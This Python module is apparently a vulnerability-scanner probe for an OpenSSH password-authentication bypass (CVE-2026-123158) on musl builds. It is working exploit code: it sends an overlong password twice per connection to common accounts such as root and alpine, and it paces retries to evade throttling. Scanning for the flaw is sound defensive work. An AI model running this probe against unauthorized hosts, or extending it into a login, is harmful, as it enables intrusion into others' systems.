"""Differential SSH password-authentication probe for CVE-2026-123158 ("sshole").

On OpenSSH builds without PAM linked against musl libc (Alpine Linux by default),
a password-authentication bypass lets an overlong password (roughly 256-1024
bytes) authenticate certain accounts. musl's crypt() returns the string "*" for
an overlong key; combined with a shadow-buffer aliasing bug, sshd ends up
comparing that "*" against a stored "*" placeholder and accepts the login. See
https://nvd.nist.gov/vuln/detail/CVE-2026-123158 and
https://www.openssh.com/releasenotes.html#10.6p2.

The quirk is that the bypass depends on a salt cached within a single SSH
connection: the first overlong-password attempt is rejected, and a second
attempt on the *same* transport succeeds. This probe therefore sends the overlong
password twice over one connection and treats a success on either attempt as
confirmation. A short control password (sent on a separate connection) must be
rejected first, so servers that accept any credential are not misreported.

The probe is read-only: on a successful authentication it closes the transport
immediately and never opens a channel, runs a command, or reads session data. It
has no dependency on the ostorlab agent framework so it can be exercised directly
against a lab server.
"""

from __future__ import annotations

import dataclasses
import logging
import secrets
import string
import time

import paramiko

logger = logging.getLogger(__name__)

# Overlong password inside the musl window (>256 and <=1024 bytes).
ATTACK_PASSWORD_LENGTH = 300
CONTROL_PASSWORD_LENGTH = 12
# Attempts of the overlong password on a single connection; the bypass typically
# lands on the second attempt once the vulnerable salt is cached.
ATTACK_ATTEMPTS = 2
DEFAULT_TIMEOUT_SECONDS = 10.0
# Affected OpenSSH (>=9.8) throttles a source IP after failed/aborted auths via
# PerSourcePenalties, which surfaces as "Error reading SSH protocol banner". Retry
# a few times with growing backoff, and pace connections, so throttling does not
# turn a vulnerable host into a false negative.
CONNECT_RETRIES = 3
RETRY_BACKOFF_SECONDS = 4.0
INTER_USER_DELAY_SECONDS = 1.0
# Accounts that commonly carry a "*"/"!" shadow placeholder on affected hosts.
# alpine/root are the prime musl-platform candidates and are probed first to keep
# the connection count (and penalty exposure) low; root also catches a
# misconfigured PermitRootLogin.
DEFAULT_CANDIDATE_USERNAMES = (
    "alpine",
    "root",
    "nobody",
    "sshd",
    "ftp",
    "ntp",
    "guest",
)


@dataclasses.dataclass
class ProbeResult:
    """Outcome of the differential probe against a single target."""

    vulnerable: bool
    username: str | None = None
    control_rejected: bool = False
    attack_accepted: bool = False
    attempt: int | None = None
    detail: str | None = None


def _random_password(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def _open_transport(host: str, port: int, timeout: float) -> paramiko.Transport:
    transport = paramiko.Transport((host, port))
    transport.banner_timeout = timeout
    transport.start_client(timeout=timeout)
    return transport


def _auth_once(transport: paramiko.Transport, username: str, password: str) -> bool:
    """One password attempt on an existing transport; True only on success.

    A rejected password raises AuthenticationException and leaves the transport
    usable for a further attempt; any other error propagates so the caller drops
    the connection.
    """
    try:
        transport.auth_password(username, password)
        return bool(transport.is_authenticated())
    except paramiko.AuthenticationException:
        return False


def _close(transport: paramiko.Transport | None) -> None:
    if transport is not None:
        try:
            transport.close()
        except (paramiko.SSHException, OSError, EOFError):
            pass


def _open_transport_with_retry(
    host: str, port: int, timeout: float
) -> paramiko.Transport | None:
    """Open a transport, retrying through PerSourcePenalties throttling."""
    for attempt in range(1, CONNECT_RETRIES + 1):
        try:
            return _open_transport(host, port, timeout)
        except (paramiko.SSHException, OSError, EOFError) as error:
            logger.debug(
                "Connect attempt %d/%d to %s:%s failed: %s",
                attempt,
                CONNECT_RETRIES,
                host,
                port,
                error,
            )
            if attempt < CONNECT_RETRIES:
                time.sleep(RETRY_BACKOFF_SECONDS * attempt)
    return None


def _control_accepts_anything(
    host: str, port: int, username: str, timeout: float
) -> bool:
    """True if a short random password authenticates (server accepts anything)."""
    transport = _open_transport_with_retry(host, port, timeout)
    if transport is None:
        return False
    try:
        return _auth_once(
            transport, username, _random_password(CONTROL_PASSWORD_LENGTH)
        )
    except (paramiko.SSHException, OSError, EOFError):
        return False
    finally:
        _close(transport)


def _attack_user(
    host: str, port: int, username: str, timeout: float, attack_length: int
) -> int | None:
    """Return the attempt number (1-based) that authenticated, or None.

    Sends the overlong password up to ATTACK_ATTEMPTS times on a single
    connection; the bypass typically lands on the second attempt.
    """
    transport = _open_transport_with_retry(host, port, timeout)
    if transport is None:
        return None
    try:
        password = "A" * attack_length
        for attempt in range(1, ATTACK_ATTEMPTS + 1):
            if _auth_once(transport, username, password) is True:
                return attempt
        return None
    except (paramiko.SSHException, OSError, EOFError) as error:
        logger.debug("Attack probe error for %s@%s:%s: %s", username, host, port, error)
        return None
    finally:
        _close(transport)


def confirm_password_bypass(
    host: str,
    port: int,
    usernames: tuple[str, ...] = DEFAULT_CANDIDATE_USERNAMES,
    *,
    timeout: float = DEFAULT_TIMEOUT_SECONDS,
    attack_length: int = ATTACK_PASSWORD_LENGTH,
) -> ProbeResult:
    """Confirm the CVE-2026-123158 password bypass via the two-attempt probe.

    For each candidate account the overlong password is sent up to ATTACK_ATTEMPTS
    times on one connection (attack-first, to minimise connections and penalty
    exposure). On a success, a short control password is then checked on a fresh
    connection; if that also authenticates the server accepts anything and the
    result is discarded, otherwise the bypass is confirmed.
    """
    for index, username in enumerate(usernames):
        if index > 0:
            time.sleep(INTER_USER_DELAY_SECONDS)

        attempt = _attack_user(host, port, username, timeout, attack_length)
        if attempt is None:
            continue

        if _control_accepts_anything(host, port, username, timeout) is True:
            logger.debug("Control password also accepted for %s; discarding.", username)
            continue

        detail = (
            f"Account '{username}' rejected a {CONTROL_PASSWORD_LENGTH}-byte "
            f"control password but accepted a {attack_length}-byte password on "
            f"attempt {attempt} of a single connection, confirming the musl "
            "crypt() authentication bypass."
        )
        return ProbeResult(
            vulnerable=True,
            username=username,
            control_rejected=True,
            attack_accepted=True,
            attempt=attempt,
            detail=detail,
        )

    return ProbeResult(vulnerable=False)
